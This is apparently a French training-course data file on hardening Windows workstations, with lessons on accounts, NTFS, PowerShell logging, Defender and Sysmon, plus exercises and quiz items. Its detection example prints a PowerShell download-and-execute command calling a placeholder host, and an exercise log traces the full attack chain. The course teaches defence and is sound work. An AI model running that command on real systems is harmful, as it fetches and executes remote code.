import type { CourseBody } from '../../types';

export const body: CourseBody = {
  courseId: 'd-windows-poste-durcissement',
  lesson: {
    intro:
      'Le poste de travail Windows est la porte d’entrée la plus fréquente des attaques : une pièce jointe ouverte, une macro, un script téléchargé. La plupart des protections nécessaires sont déjà présentes dans le système, encore faut-il les activer, les régler et produire des journaux qui permettent de comprendre ce qui s’est passé. Ce cours parcourt ces protections couche par couche, du compte utilisateur jusqu’à la journalisation.',
    sections: [
      {
        id: 'comptes',
        title: 'Comptes, jetons et UAC',
        blocks: [
          { t: 'p', text: 'Chaque processus Windows s’exécute avec un **jeton d’accès** qui porte l’identité de l’utilisateur (son SID), ses groupes et ses privilèges. C’est ce jeton que le système compare aux permissions de chaque objet (fichier, clé de registre, service).' },
          { t: 'def', term: 'UAC (contrôle de compte d’utilisateur)', text: 'Un administrateur ouvre une session avec **deux jetons** : un jeton filtré, sans droits d’administration, utilisé par défaut, et un jeton complet utilisé seulement après une demande d’élévation. L’UAC est une barrière de confort et de réduction des risques ; Microsoft ne la considère pas comme une frontière de sécurité.' },
          {
            t: 'table',
            head: ['Situation', 'Risque', 'Mesure'],
            rows: [
              ['L’utilisateur travaille avec un compte administrateur local', 'Un malware lancé par l’utilisateur peut s’élever et désactiver les protections', 'Compte standard au quotidien, compte d’administration séparé'],
              ['Même mot de passe d’administrateur local sur tous les postes', 'Un poste compromis donne accès à tous les autres (mouvement latéral)', 'Mot de passe unique et renouvelé (Windows LAPS)'],
              ['Mémoire de LSASS lisible par un processus administrateur', 'Vol d’empreintes et de tickets (Mimikatz)', 'Protection LSA (RunAsPPL), Credential Guard'],
            ],
          },
          { t: 'callout', kind: 'key', text: 'Retirer les droits d’administration local aux utilisateurs est, à elle seule, l’une des mesures les plus efficaces : beaucoup de techniques d’attaque sur le poste supposent ces droits.' },
        ],
      },
      {
        id: 'ntfs',
        title: 'Permissions NTFS et icacls',
        blocks: [
          { t: 'p', text: 'Sur NTFS, chaque fichier et dossier porte une **liste de contrôle d’accès** (DACL) composée d’entrées (ACE) qui autorisent ou refusent des droits à des comptes ou des groupes. Les permissions s’**héritent** par défaut du dossier parent.' },
          { t: 'code', lang: 'text', caption: 'Lire puis corriger les permissions d’un dossier de scripts', code: 'C:\\> icacls C:\\Scripts\nC:\\Scripts BUILTIN\\Utilisateurs:(OI)(CI)(M)\n           BUILTIN\\Administrateurs:(OI)(CI)(F)\n           AUTORITE NT\\Système:(OI)(CI)(F)\n\n:: Les utilisateurs peuvent MODIFIER les scripts : dangereux si une tâche planifiée\n:: les exécute avec un compte privilégié.\nC:\\> icacls C:\\Scripts /remove:g "BUILTIN\\Utilisateurs"\nC:\\> icacls C:\\Scripts /grant "BUILTIN\\Utilisateurs:(OI)(CI)RX"' },
          {
            t: 'table',
            caption: 'Abréviations icacls',
            head: ['Code', 'Signification'],
            rows: [['F', 'Contrôle total'], ['M', 'Modification (lecture, écriture, suppression)'], ['RX', 'Lecture et exécution'], ['(OI) / (CI)', 'Héritage vers les fichiers / vers les sous-dossiers'], ['/inheritance:r', 'Supprime les permissions héritées du parent']],
          },
          { t: 'def', term: 'Refus explicite', text: 'Une ACE de refus l’emporte sur une autorisation de même niveau. Les refus se gèrent difficilement : on préfère ne pas accorder le droit plutôt que de le refuser ensuite.' },
        ],
      },
      {
        id: 'powershell',
        title: 'PowerShell : outil d’administration et d’attaque',
        blocks: [
          { t: 'p', text: 'PowerShell donne un accès complet au système et à .NET : c’est l’outil des administrateurs, et pour la même raison l’un des plus utilisés par les attaquants (« living off the land »). Le bloquer complètement est rarement possible ; on le **rend observable** et on le **restreint**.' },
          { t: 'diagram', id: 'attack-chain', caption: 'Chaîne d’attaque typique partant d’une macro Office, et la parade qui coupe chaque étape : aucune mesure n’est suffisante seule, mais ensemble elles brisent la chaîne.', alt: 'Schéma d’une chaîne d’attaque Word vers PowerShell vers téléchargement vers persistance vers accès LSASS, avec sous chaque étape la défense correspondante : règle ASR, langage restreint, filtrage proxy, contrôle d’applications, protection LSA.' },
          { t: 'callout', kind: 'warn', title: 'La stratégie d’exécution n’est pas une protection', text: 'La documentation Microsoft le précise : la stratégie d’exécution (`Set-ExecutionPolicy`) n’est pas une frontière de sécurité, seulement une défense en profondeur qui évite surtout d’exécuter un script par mégarde. Elle se contourne trivialement (`powershell -ExecutionPolicy Bypass`, copier-coller du contenu). Elle ne remplace ni la journalisation ni le contrôle des applications.' },
          {
            t: 'table',
            head: ['Mesure', 'Effet'],
            rows: [
              ['Journalisation des blocs de script', 'Enregistre le code réellement exécuté, **après** désobfuscation, dans `Microsoft-Windows-PowerShell/Operational` (événement **4104**)'],
              ['Journalisation des modules (4103) et transcription', 'Trace les commandes et leurs sorties'],
              ['Mode de langage restreint', 'Imposé par App Control for Business (WDAC) ou AppLocker : bloque l’accès direct à .NET et aux API Windows pour les scripts non approuvés'],
              ['Suppression du moteur PowerShell 2.0', 'Cette ancienne version ne connaît pas la journalisation des blocs de script : un attaquant peut l’invoquer pour échapper aux traces'],
            ],
          },
          {
            t: 'example',
            title: 'Ce que révèle l’événement 4104',
            blocks: [
              { t: 'code', lang: 'text', code: 'Ligne de commande vue par le processus :\npowershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\n\nÉvénement 4104 (bloc de script décodé) :\nIEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.7/a.ps1\')' },
              { t: 'p', text: 'La commande encodée en Base64 masque son intention ; la journalisation des blocs de script montre le téléchargement puis l’exécution en mémoire d’un script distant. Cet événement, l’adresse et le processus parent (souvent Word ou Outlook) suffisent à ouvrir un incident.' },
            ],
          },
        ],
      },
      {
        id: 'protections',
        title: 'Protections intégrées : Defender, pare-feu, BitLocker',
        blocks: [
          { t: 'list', items: ['**Microsoft Defender Antivirus** avec la **protection contre les falsifications** activée : un processus, même administrateur, ne peut plus désactiver la protection en temps réel.', '**Règles de réduction de la surface d’attaque (ASR)** : par exemple, empêcher les applications Office de créer des processus enfants, bloquer le vol d’identifiants dans `lsass.exe`, bloquer le contenu exécutable reçu par courriel. Elles se déploient d’abord en mode **audit**, puis en mode **blocage**.', '**Pare-feu Windows** : trois profils (domaine, privé, public). Le profil public s’applique sur un réseau inconnu et doit refuser toutes les connexions entrantes.', '**BitLocker** : chiffrement du disque, clé protégée par le TPM.'] },
          { t: 'def', term: 'TPM (module de plateforme sécurisée)', text: 'Composant qui stocke des clés et ne les libère que si la chaîne de démarrage mesurée n’a pas été modifiée. Avec BitLocker en mode **TPM seul**, le disque se déverrouille automatiquement au démarrage ; en mode **TPM + code PIN**, il faut en plus un code, ce qui protège mieux un portable volé contre certaines attaques physiques.' },
          { t: 'callout', kind: 'tip', text: 'La clé de récupération BitLocker doit être sauvegardée dans l’annuaire (Active Directory ou Entra ID) **avant** le chiffrement : sans elle, une mise à jour du micrologiciel ou un changement de carte mère peut rendre les données irrécupérables.' },
        ],
      },
      {
        id: 'journaux',
        title: 'Journaux Windows et Sysmon',
        blocks: [
          { t: 'p', text: 'Par défaut, Windows journalise peu de choses utiles à la détection. Deux réglages changent tout : l’audit de **création de processus avec ligne de commande** (événement de sécurité **4688**) et **Sysmon**, outil gratuit de la suite Sysinternals qui produit des événements détaillés.' },
          {
            t: 'table',
            caption: 'Événements Sysmon les plus utilisés',
            head: ['ID', 'Événement', 'Usage en détection'],
            rows: [
              ['1', 'Création de processus (avec empreinte et processus parent)', 'Office qui lance PowerShell, binaire lancé depuis un dossier temporaire'],
              ['3', 'Connexion réseau', 'Processus inattendu qui contacte Internet'],
              ['7', 'Chargement d’une image (DLL)', 'Chargement de DLL non signée par un processus système'],
              ['8', 'Création de thread distant', 'Injection de code dans un autre processus'],
              ['10', 'Accès à un processus', 'Ouverture de `lsass.exe` en lecture : vol d’identifiants'],
              ['11', 'Création de fichier', 'Dépôt d’exécutables ou de scripts'],
              ['13', 'Modification d’une valeur de registre', 'Persistance via les clés `Run`'],
              ['22', 'Requête DNS', 'Domaines contactés par chaque processus'],
            ],
          },
          { t: 'def', term: 'Configuration Sysmon', text: 'Fichier XML qui indique quoi inclure et exclure. Sans filtrage, Sysmon produit un volume ingérable ; on part d’une configuration communautaire maintenue, puis on l’adapte à son parc.' },
          { t: 'callout', kind: 'key', text: 'Des journaux qui restent sur le poste ne servent qu’après coup, et peuvent être effacés (événement 1102 côté journal de sécurité). Ils doivent être collectés en continu (Windows Event Forwarding ou agent du SIEM).' },
        ],
      },
    ],
    useCases: [
      'Projet de durcissement d’un parc : comptes standard, LAPS, règles ASR en audit puis en blocage, BitLocker avec sauvegarde de la clé dans l’annuaire.',
      'SOC : déployer Sysmon et la journalisation PowerShell pour pouvoir détecter les chaînes « Office → PowerShell → téléchargement ».',
      'Audit de poste : lister les dossiers modifiables par les utilisateurs et exécutés par des comptes privilégiés.',
    ],
    commonMistakes: [
      'Laisser les utilisateurs administrateurs locaux « pour éviter les tickets ».',
      'Considérer `Set-ExecutionPolicy Restricted` comme une protection contre les scripts malveillants.',
      'Activer les règles ASR directement en blocage sans phase d’audit, puis tout désactiver face aux faux positifs.',
      'Chiffrer avec BitLocker sans sauvegarder la clé de récupération.',
      'Déployer Sysmon sans configuration de filtrage, puis ne plus exploiter les journaux faute de pouvoir les lire.',
    ],
    bestPractices: [
      'Compte standard au quotidien, compte d’administration distinct, mot de passe d’administrateur local unique (LAPS).',
      'Protection LSA et Credential Guard sur les postes compatibles.',
      'Journalisation des blocs de script PowerShell, mode de langage restreint via le contrôle des applications, suppression de PowerShell 2.0.',
      'Defender avec protection contre les falsifications, règles ASR, pare-feu actif sur les trois profils.',
      'Sysmon avec une configuration maintenue, audit 4688 avec ligne de commande, collecte centrale des journaux.',
    ],
    keyPoints: [
      'Le jeton d’accès porte l’identité ; l’UAC sépare jeton filtré et jeton complet.',
      'Permissions NTFS : héritage par défaut, `icacls` pour lire et corriger.',
      'La stratégie d’exécution PowerShell n’est pas une barrière de sécurité ; l’événement 4104 montre le code réel.',
      'ASR, protection contre les falsifications, pare-feu par profil, BitLocker avec TPM : déjà présents, à activer.',
      'Sysmon : 1 processus, 3 réseau, 10 accès à un processus, 22 DNS.',
    ],
  },
  practice: [
    {
      id: 'chaine-office',
      kind: 'analysis',
      title: 'Analyse d’une chaîne d’événements sur un poste',
      context: [
        { t: 'p', text: 'Événements Sysmon d’un poste, triés par heure :' },
        { t: 'code', lang: 'text', code: '09:14:02  ID 1   WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA...\n09:14:03  ID 22  powershell.exe → requête DNS mise-a-jour-office.example\n09:14:03  ID 3   powershell.exe → 203.0.113.7:443\n09:14:05  ID 11  powershell.exe → C:\\Users\\lea\\AppData\\Roaming\\upd.exe\n09:14:06  ID 13  powershell.exe → HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd\n09:14:09  ID 10  upd.exe → accès à lsass.exe (0x1010)' },
      ],
      steps: ['Reconstituer le scénario étape par étape.', 'Associer chaque étape à une technique ou une tactique (accès initial, exécution, persistance, accès aux identifiants).', 'Indiquer quelle mesure de durcissement aurait bloqué chaque étape.'],
    },
    {
      id: 'plan-durcissement',
      kind: 'case',
      title: 'Cas pratique : plan de durcissement d’un parc de 300 postes',
      context: [{ t: 'p', text: 'Une PME de 300 postes Windows 11 gérés par Active Directory : utilisateurs administrateurs locaux, même mot de passe d’administrateur partout, aucun chiffrement des portables, journaux non collectés.' }],
      steps: ['Proposer les mesures par ordre de priorité.', 'Pour chaque mesure, indiquer comment la déployer sans bloquer l’activité.', 'Proposer un indicateur qui montre que la mesure est en place.'],
    },
  ],
  questions: [
    { id: 'wpo-q1', type: 'single', difficulty: 1, skills: ['d-win-acces'], prompt: 'Pourquoi un utilisateur ne devrait-il pas travailler au quotidien avec un compte administrateur local ?', options: [{ id: 'a', text: 'Un programme malveillant lancé par l’utilisateur peut obtenir les droits d’administration et désactiver les protections' }, { id: 'b', text: 'Le poste démarre plus lentement' }, { id: 'c', text: 'Les administrateurs ne peuvent pas utiliser Office' }, { id: 'd', text: 'Windows refuse de créer plus d’un administrateur' }] },
    { id: 'wpo-q2', type: 'truefalse', difficulty: 2, skills: ['d-win-acces'], prompt: 'Microsoft considère l’UAC comme une frontière de sécurité : contourner l’UAC est donc toujours traité comme une vulnérabilité critique.' },
    { id: 'wpo-q3', type: 'short', difficulty: 2, skills: ['d-win-acces'], prompt: 'Dans une sortie `icacls`, quelle abréviation désigne le contrôle total ?' },
    { id: 'wpo-q4', type: 'multi', difficulty: 2, skills: ['d-win-acces'], prompt: 'Une tâche planifiée exécute en SYSTEM `C:\\Outils\\maj.ps1`, et `icacls C:\\Outils` montre `BUILTIN\\Utilisateurs:(OI)(CI)(M)`. Quelles affirmations sont exactes ?', options: [{ id: 'a', text: 'Tout utilisateur peut modifier le script et faire exécuter son code en SYSTEM' }, { id: 'b', text: '(OI)(CI) signifie que la permission s’hérite aux fichiers et sous-dossiers' }, { id: 'c', text: 'Le risque disparaît si le script est signé, même sans vérification de signature' }, { id: 'd', text: 'Il faut retirer la modification aux utilisateurs et ne leur laisser au plus que RX' }] },
    { id: 'wpo-q5', type: 'single', difficulty: 2, skills: ['d-win-powershell'], prompt: 'Que vaut la stratégie d’exécution PowerShell `Restricted` face à un attaquant ?', options: [{ id: 'a', text: 'Peu de chose : elle se contourne par exemple avec `-ExecutionPolicy Bypass` ; elle sert surtout à éviter les exécutions accidentelles' }, { id: 'b', text: 'Elle bloque toute exécution de code PowerShell, y compris en ligne de commande' }, { id: 'c', text: 'Elle chiffre les scripts' }, { id: 'd', text: 'Elle n’autorise que les scripts signés par Microsoft, sans exception possible' }] },
    { id: 'wpo-q6', type: 'short', difficulty: 2, skills: ['d-win-powershell'], prompt: 'Quel est l’identifiant de l’événement qui enregistre les blocs de script PowerShell exécutés ?', placeholder: 'numéro' },
    { id: 'wpo-q7', type: 'truefalse', difficulty: 2, skills: ['d-win-powershell'], prompt: 'Une commande PowerShell encodée en Base64 (`-enc`) apparaît en clair dans l’événement de journalisation des blocs de script.' },
    { id: 'wpo-q8', type: 'multi', difficulty: 3, skills: ['d-win-powershell'], prompt: 'Quelles mesures réduisent réellement l’usage malveillant de PowerShell ?', options: [{ id: 'a', text: 'Mode de langage restreint imposé par le contrôle des applications (App Control for Business ou AppLocker)' }, { id: 'b', text: 'Suppression du moteur PowerShell 2.0' }, { id: 'c', text: 'Renommer `powershell.exe`' }, { id: 'd', text: 'Journalisation des blocs de script collectée par le SIEM' }] },
    { id: 'wpo-q9', type: 'single', difficulty: 2, skills: ['d-win-protections'], prompt: 'Que garantit la protection contre les falsifications de Microsoft Defender ?', options: [{ id: 'a', text: 'Les réglages de protection, comme la protection en temps réel, ne peuvent pas être désactivés par un processus local, même administrateur' }, { id: 'b', text: 'Les fichiers du poste sont chiffrés' }, { id: 'c', text: 'Les courriels sont signés' }, { id: 'd', text: 'Le pare-feu bloque tout le trafic sortant' }] },
    { id: 'wpo-q10', type: 'truefalse', difficulty: 1, skills: ['d-win-protections'], prompt: 'Il est recommandé de déployer les règles de réduction de la surface d’attaque d’abord en mode audit, puis en mode blocage.' },
    { id: 'wpo-q11', type: 'multi', difficulty: 2, skills: ['d-win-protections'], prompt: 'Concernant BitLocker, quelles affirmations sont exactes ?', options: [{ id: 'a', text: 'En mode TPM seul, le disque se déverrouille automatiquement si la chaîne de démarrage est intacte' }, { id: 'b', text: 'Le mode TPM + code PIN protège mieux un portable volé contre certaines attaques physiques' }, { id: 'c', text: 'La clé de récupération doit être sauvegardée avant le chiffrement, par exemple dans l’annuaire' }, { id: 'd', text: 'BitLocker protège les fichiers contre un malware qui s’exécute pendant que la session est ouverte' }] },
    { id: 'wpo-q12', type: 'open', difficulty: 3, skills: ['d-win-protections', 'd-win-acces'], prompt: 'Un utilisateur nomade se connecte au Wi-Fi d’un hôtel. Expliquez quelles protections intégrées de Windows le protègent et comment elles doivent être réglées.' },
    { id: 'wpo-q13', type: 'single', difficulty: 2, skills: ['d-win-journaux'], prompt: 'Quel événement Sysmon signale l’ouverture d’un autre processus, utile pour repérer un accès à `lsass.exe` ?', options: [{ id: 'a', text: 'ID 10 (accès à un processus)' }, { id: 'b', text: 'ID 22 (requête DNS)' }, { id: 'c', text: 'ID 11 (création de fichier)' }, { id: 'd', text: 'ID 3 (connexion réseau)' }] },
    { id: 'wpo-q14', type: 'short', difficulty: 2, skills: ['d-win-journaux'], prompt: 'Quel identifiant d’événement Sysmon correspond à la création d’un processus ?', placeholder: 'numéro' },
    { id: 'wpo-q15', type: 'open', difficulty: 3, skills: ['d-win-journaux', 'd-win-powershell'], prompt: 'Votre SOC ne voit rien de ce qui se passe sur les postes. Proposez une configuration de journalisation minimale mais utile, et expliquez ce qu’elle permettra de détecter.' },
    { id: 'wpo-q16', type: 'single', difficulty: 2, skills: ['d-win-journaux'], prompt: 'Pourquoi faut-il une configuration de filtrage pour Sysmon ?', options: [{ id: 'a', text: 'Sans filtrage, le volume d’événements devient ingérable et noie les signaux utiles' }, { id: 'b', text: 'Sysmon refuse de démarrer sans fichier de configuration' }, { id: 'c', text: 'La configuration chiffre les événements' }, { id: 'd', text: 'Elle remplace l’antivirus' }] },
  ],
  resources: [
    { title: 'About Execution Policies', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_execution_policies' },
    { title: 'Attack surface reduction rules reference', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference' },
    { title: 'Sysmon', source: 'Microsoft Sysinternals', url: 'https://learn.microsoft.com/sysinternals/downloads/sysmon' },
    { title: 'BitLocker overview', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/windows/security/operating-system-security/data-protection/bitlocker/' },
    { title: 'Recommandations relatives à l’administration sécurisée des SI', source: 'ANSSI', url: 'https://cyber.gouv.fr/publications/recommandations-relatives-ladministration-securisee-des-si' },
  ],
};
